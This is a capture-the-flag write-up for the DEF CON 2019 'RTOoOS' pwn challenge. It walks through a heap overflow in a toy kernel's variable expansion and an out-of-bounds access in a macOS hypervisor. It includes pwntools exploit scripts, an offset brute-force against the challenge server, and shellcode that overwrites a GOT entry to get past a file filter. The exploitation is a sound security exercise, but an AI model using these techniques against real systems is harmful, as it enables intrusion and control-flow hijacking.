## 143 Pwn / RTOoOS

### Overview

In this challenge, a raw binary file that implements a command line using
`amd64` assembly is given, but the hypervisor that is running this binary on
remote server is not given. We can read files in remote server except `honcho`
(the hypervisor) and `flag`, which are banned by kernel and hypervisor
respectively. We need to find the vulnerability in the kernel to leak
hypervisor first, then find the vulnerability in hypervisor to read the flag.

### Reverse Engineering Kernel

The kernel implements a simple command shell

```c  
//main function  
void __fastcall __noreturn sub_13F0(__int64 a1, __int64 a2, __int64 a3,
__int64 a4)  
{  
 unsigned __int16 v4; // dx  
 unsigned __int16 v5; // dx  
 unsigned __int16 v6; // dx  
 int v7; // ST1C_4  
 char a1a[520]; // [rsp+20h] [rbp-230h]  
 __int64 v9; // [rsp+228h] [rbp-28h]  
 __int64 v10; // [rsp+230h] [rbp-20h]  
 __int64 v11; // [rsp+238h] [rbp-18h]  
 __int64 v12; // [rsp+240h] [rbp-10h]

 v12 = a1;  
 v11 = a2;  
 v10 = a3;  
 v9 = a4;  
 init_heap(&unk_3650, 0x1000LL);  
 print("CS420 - Homework 1", 0x1000LL, v4);  
 print("Student: Kurt Mandl", 0x1000LL, v5);  
 print("Submission Stardate 37357.84908798814", 0x1000LL, v6);  
 while ( 1 )  
 {  
   memset(a1a, 0, 512u);  
   print_cmd_arr();  
   v7 = get_input(a1a, 511LL, 0x1FFu);  
   execute_cmd((unsigned __int8 *)a1a, v7);  
 }  
}  
```

We I am looking at the `print` and `get_input` functions, it seems that they
all use `out`, which is a bit weird to use `out` to get user input. But then I
realize it is a binary run in hypervisor, so the hypervisor can execute
anything including `read` even if an `out` instruction is used.

When executing `cat`, it seems the `honcho` is blocked here

```c  
v6 = strlen("cat ");  
if ( !memcmp("cat ", cmd, v6) )  
{  
 if ( (signed int)strlen((char *)cmd) <= 4 )  
 {  
   v40 = 0;  
   print("no file to cat", (__int64)cmd, v7);  
   return v40;  
 }  
 if ( substr((char *)cmd + 4, "honcho") )  
   print("reading hypervisor blocked by kernel!!", (__int64)"honcho", v8);  
 else  
   cat((__int64)(cmd + 4), (__int64)"honcho", v8);  
}  
```

A interesting function is environment variable, in which variables are stored
using key-value pair. The structure is something like this:

```c  
char keys[16][512]; //at 0x1650, 512*16 = 0x2000  
//something in the middle(0x3650), covered later  
char* values[16]; //at 0x4650  
//A key-value pair will have same index value  
```

When `export` is executed, it will change the `value` in current variable if
`stored key == input key`, and also add a new key-value pair if there is free
index. This is a bit weird, because it will create 2 variables with same key
and value if same key is exported twice.

```c  
if ( !memcmp("export ", cmd, v9) )  
{  
 export_key = (char *)&cmd[(signed int)strlen("export ")];  
 export_val = 0LL;  
 for ( i = 0; i < (signed int)strlen(export_key); ++i )  
 {  
   if ( export_key[i] == '=' )  
   {  
     export_val = &export_key[i + 1];  
     export_key[i] = 0;  
     break;  
   }  
 }  
 for ( j = 0; j < 16; ++j )  
 {  
   v32 = 0;  
   if ( (unsigned int)strlen((char *)(((signed __int64)j << 9) + 0x1650))  
     && !strcmp((unsigned __int8 *)(((signed __int64)j << 9) + 0x1650), (unsigned __int8 *)export_key) )  
   {                                   // there is currently the same key  
     v10 = len - (unsigned __int64)strlen(export_key);  
     len = v10 - (unsigned __int64)strlen("export");  
     for ( k = 0; k < len; values[j][v32++] = export_val[k++] )  
     {  
       if ( export_val[k] == '$' )  
       {  
         for ( l = 0; l < 16; ++l )  
         {  
           v11 = strlen((char *)(((signed __int64)l << 9) + 0x1650));  
           if ( !memcmp(  
                   (unsigned __int8 *)&export_val[k + 1],  
                   (unsigned __int8 *)(((signed __int64)l << 9) + 0x1650),  
                   v11) )  
           {  
             for ( m = 0; m < (signed int)strlen(values[l]); ++m )  
             {  
               v12 = v32++;  
               values[j][v12] = values[l][m];  
             }  
             k += strlen(values[l]);   // value? should it be key?  
             break;  
           }                           // might be vulnerable here  
         }  
       }  
     }  
   }  
 }  
 v28 = 0;  
 for ( n = 0; n < 16; ++n )  
 {  
   if ( !(unsigned int)strlen((char *)(((signed __int64)n << 9) + 0x1650)) )  
   {  
     v13 = strlen(export_key);  
     memcpy((char *)(((signed __int64)n << 9) + 0x1650), export_key, v13);  
     v14 = 512 - (unsigned __int64)strlen(export_key);  
     v15 = strlen("export ");  
     values[n] = (char *)malloc(v14 - v15 + 1);// no 0 checking  
     v16 = 512 - (unsigned __int64)strlen(export_key);  
     lena = v16 - (unsigned __int64)strlen("export ");  
     for ( ii = 0; ii < lena; values[n][v28++] = export_val[ii++] )  
     {  
       if ( export_val[ii] == '$' )  
       {  
         for ( jj = 0; jj < 16; ++jj )  
         {  
           v17 = strlen((char *)(((signed __int64)jj << 9) + 0x1650));  
           if ( !memcmp(  
                   (unsigned __int8 *)&export_val[ii + 1],  
                   (unsigned __int8 *)(((signed __int64)jj << 9) + 0x1650),  
                   v17) )  
           {  
             for ( kk = 0; kk < (signed int)strlen(values[jj]); ++kk )  
             {  
               v18 = v28++;  
               values[n][v18] = values[jj][kk];// certainly overflow  
             }  
             ii += strlen(values[jj]);  
             break;  
           }  
         }  
       }  
     }  
     return 0;  
   }  
 }  
}  
```

It will also expands environment variable if `'$'` is found in the input
value. This is where the vulnerability comes from. After the expansion, the
string can be longer than the original input, thus causing heap overflow.
Actually there are other vulnerabilities: for example, there is no `null`
check when `malloc` is called, but I found them harder to exploit than that
heap overflow.

However, we also need to know how heap is implemented here. It is just a
simple single linked list heap implementation.

```c  
struct chunk  
{  
 unsigned __int64 avai_size;  
 int isfree;  
 chunk *next;  
};  
void __fastcall init_heap(_QWORD *a1, __int64 a2)  
{//init_heap(&unk_3650, 0x1000LL);  
 heap = a1;  
 list = (chunk *)a1;  
 list->avai_size = a2 - 0x18;  
 list->isfree = 1;  
 list->next = 0LL;  
 size = a2;  
}  
signed __int64 __fastcall malloc(unsigned __int64 a1)  
{  
 bool v2; // [rsp+7h] [rbp-29h]  
 chunk *a1a; // [rsp+18h] [rbp-18h]  
 signed __int64 v4; // [rsp+28h] [rbp-8h]

 if ( !list->avai_size )  
   BUG();  
 for ( a1a = list; ; a1a = a1a->next )  
 {//traverse the list to find an available one  
   if ( a1a->avai_size < a1 || (v2 = 0, !a1a->isfree) )  
     v2 = a1a->next != 0LL;  
   if ( !v2 )  
     break;  
 }  
 if ( a1a->avai_size == a1 )  
 {// if size excactly match  
   a1a->isfree = 0;  
   v4 = (signed __int64)&a1a[1];  
 }  
 else if ( a1a->avai_size <= a1 + 24 )         // problematic, but hard to
exploit  
 {// if size is not enough  
   v4 = 0LL;                                   // no heap space, return 0  
 }  
 else  
 {// if size needed is smaller than the free chunk we have  
   sub_100(a1a, a1);  
   v4 = (signed __int64)&a1a[1];  
 }  
 return v4;  
}  
void __fastcall sub_100(chunk *a1, __int64 a2)  
{//split the chunk  
 chunk *v2; // ST00_8  
 v2 = (chunk *)((char *)a1 + a2 + 0x18);  
 v2->avai_size = a1->avai_size - a2 - 0x18;  
 v2->isfree = 1;  
 v2->next = a1->next;  
 a1->avai_size = a2;  
 a1->isfree = 0;  
 a1->next = v2;  
}  
```

The key is that after the heap, there is `char* values[16]` array, so as long
as we can allocate chunk that is just before the `values`, we can use heap
overflow to rewrite it.

### Exploit Kernel

To rewrite `values` array, what I did is to allocate chunk with size `0x200`
for 6 times, then allocate chunk with size `0x200` with value long enough
followed by new pointer in the end that will rewrite `values[0]`, then
allocate chunk with size `0x200` to cause overflow.

```python  
def allocate_pre(sh):  
	sh.recvuntil(ARR)  
	for i in xrange(6):  
		export(sh, str(i) * l, str(i))

def leak_honcho(sh):  
	honcho = 0x1508  
	export(sh, str(7) * l, 'A' * (l+1+3) + p16(honcho))  
	export(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)  
	export(sh, '0' * l, "leak") # rewrite "honcho" global string  
	data = cat("honcho")

	f = open("honcho", "wb")  
	f.write(data)  
	f.close()  
```

### Reverse Engineering Hypervisor

After dumping the hypervisor, we found that this is a MacOS executable, which
I am not familiar with. This is the first time for me to exploit a MacOS
program, and I don't have a MacOS machine either, but fortunately there are
MacOS machines in our lab.

The symbols are not stripped which is great, there are many hypervisor stuff
which you actually don't need to get into, because the handler of `out` from
that simple OS is an obvious switch statement.

The vulnerability is here, out-of-bound access.

```c  
case 'c':  
 v8 = read(0, (char *)vm_mem + v22, v19);  
 hv_vcpu_write_register((unsigned int)vcpu, 2LL, v8);  
 break;  
case 'd':  
 puts((const char *)vm_mem + v22);  
 break;  
```

Also, I have patched out function `drop_privs`, which is not useful and with
this function we need `root` privilege to run the binary, which I don't have
in our lab machine.

### Exploit Hypervisor

After some debugger, I found that even if the PIE is enabled, the offset from
`vm_mem` to program base is constant. This is great: we can use OOB to leak
and rewrite `got` table in the binary and hijack control flow. What I am
thinking about is to rewrite `strcasestr` to something that will return `0`,
which enables us to read the flag.

```c  
case 'f':  
 v12 = v3;  
 v13 = (char *)vm_mem + v22;  
 if ( strcasestr((const char *)vm_mem + v22, "flag") )  
 {  
   printf("hypervisor blocked read of %s\n", v13);  
 }  
 else  
 {  
   v14 = ReadFile(0LL, v13, (__int64 *)&v21);  
   write(1, v14, v21);  
 }  
```

Initially I was thinking about `malloc`, which should returns `null` when the
size(`vm_mem + v22`) is too big, but this does not seem work and I am not sure
why; then I found `atoi` works fine because `atoi("flag")` returns 0.

However, even if in the same machine the offset from `vm_mem` to program base
is constant, in the remote machine that offset is different from the local
one. I realized this when I run this program on different MacOS machines
(thanks @[PK398](https://github.com/PK398) for providing his MacOS machine
that helps my analysis :D). So, I tried to brute force to find the correct
offset.The method to execute shellcode is same as the technique used to modify
`"honcho"` global string, but this time we change the codes in handler of
`export` command (this is chosen because codes here are long, so less likely
to rewrite something that should not be modified).

```python  
def rce(sh,shellcode):  
	export_handler = 0xC43  
	export(sh, str(7) * l, 'A' * (l+1+3) + p16(export_handler))  
	export(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)  
	no_zero(shellcode)  
	export(sh, '0' * l, shellcode)  
	sh.send("export ")  
def leak_prog(off):  
	sh = remote("rtooos.quals2019.oooverflow.io", 5000)  
	img_addr = (-(0x7966a)+off) & 0xffffffffffffffff

	allocate_pre(sh)

	puts = 0x76  
	read = 0x69  
	#asm("this: jmp this")  
	shellcode = '''  
	mov rdi,%s;  
	push 0x41;  
	pop rsi;  
	sub rdi,rsi;  
	xor rax,rax;  
	mov al,0x76;  
	call rax;  
	this:  
	jmp this;  
	''' % (hex(img_addr + 0x41))  
	payload = asm(shellcode)  
	rce(sh, payload)  
	try:  
		ret = sh.recvuntil("\n")  
		if len(ret) > 1:  
			print_hex(ret)  
			sh.interactive()  
		if ret[:3] == "\x48\x89\xC3":  
			ret = True  
		else:  
			ret = False  
		sh.close()  
	except Exception as e:  
		ret = False  
		sh.close()  
		return ret

for i in xrange(-0x30, 0x30):  
	print "testing " + hex(i)  
	if leak_prog(i * 0x1000):  
		print hex(i * 0x1000)  
		input()  
```

Even if the offset is different, they don't seem to differ a lot according to
my testing on different machines. So, I will test over range from `-0x30 to
0x30` first. We only need to test the page size (0x1000) multiples because
`vm_mem` is always page aligned.

Finally, I found the `i` to be `-0x13`.

Then it is time to write final shellcode!

```assembly  
mov rdi,atoi_got  
xor rax,rax  
mov al,0x76  
call rax ; leak address of atoi  
xor rax,rax  
mov al,0x69  
mov rdi,strcasestr_got  
push 0x41  
pop rsi  
call rax ; rewrite strcasestr to atoi  
mov rdi,strcasestr_got  
xor rax,rax  
mov al,0x76  
call rax ; check it is indeed rewritten (actually not needed)  
mov rax,0xffffffff989e9399  
xor rax,0xffffffffffffffff  
push rax  
mov rdi,rsp  
xor rax,rax  
mov al,0x87  
call rax ; cat flag  
this:  
jmp this ; used to debug: make sure everything is executed  
```

To debug the shellcode remotely (because our MacOS machine has no `socat`),
`this: jmp this` is very important: if the program finally got stuck, it shows
that our shellcode is executed without any crash; if not, it shows that
something is wrong.

Note the shellcode should be without `0`.

Here is the final [exploit](files/exp.py).

Original writeup
(https://github.com/EmpireCTF/empirectf/tree/master/writeups/2019-05-11-DEF-
CON-CTF-Qualifier#143-pwn--rtooos).